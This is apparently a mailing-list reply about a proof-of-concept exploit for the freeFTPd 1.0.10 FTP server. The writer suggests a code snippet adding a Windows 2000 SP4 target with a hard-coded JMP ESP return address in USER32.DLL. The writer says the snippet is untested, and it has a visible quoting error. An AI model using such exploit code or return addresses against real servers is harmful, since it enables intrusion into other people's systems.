Subject: Re: POC exploit for freeFTPd 1.0.10


Hello Ahmad:
I am wondering why you have not given option for Windows 2000 SP4 
Professional in your python code. Is there any technical difficulty?
I think one can include the following snippet in your code after line # 95
---------------------------------------
elif value == '4:
                 eip = "\x29\x4c\xE1\x77"  # 77E14c29 JMP ESP IN USER32.DLL 
(windows 2000 Prof. SP4)
-------------------------------------

Please correct me if I am missing something. As of now, I could not test 
this addition though.

regards
-Sanjay
